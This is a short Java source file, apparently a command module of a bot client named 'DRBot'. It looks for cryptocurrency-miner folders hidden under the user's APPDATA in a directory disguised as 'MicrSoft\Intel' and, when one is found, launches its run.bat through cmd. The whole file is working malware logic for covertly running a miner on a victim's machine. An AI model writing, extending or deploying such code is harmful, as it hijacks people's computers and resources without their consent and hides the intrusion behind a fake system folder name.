package com.DRBot.Commands;

import java.io.File;

/**
 *
 * @author MerNat
 */

public class chkMiner {
    private final String roam,roaming1,roaming2;
    private final String file;
    private final File r1,r2;
    private Thread exc;
    private Exc cExc;
    
    public chkMiner(){
        roam = System.getenv("APPDATA").replace("\\","\\\\").replace("%20"," ") + "\\MicrSoft\\Intel\\";
        roaming1 = roam + "cpu\\cpu\\";
        roaming2 = roam + "bfg\\cpu\\";
        
        r1 = new File(roaming1);
        r2 = new File(roaming2);
        
        file = chkFolders(r1,r2);
        switch (file) {
            case "r1":
                cExc = new Exc(new String[]{">exc",roaming1,"cmd_/C_run.bat"});
                exc = new Thread(cExc);
                cExc.startExc();
                break;
            case "r2":
                break;
        }
        
    }
    private String chkFolders(File r1,File r2){
        if(r1.exists()){
            return "r1";
        }
        else
            if(r2.exists()){
                return "r2";
            }
        else
                return "null";
    }

}
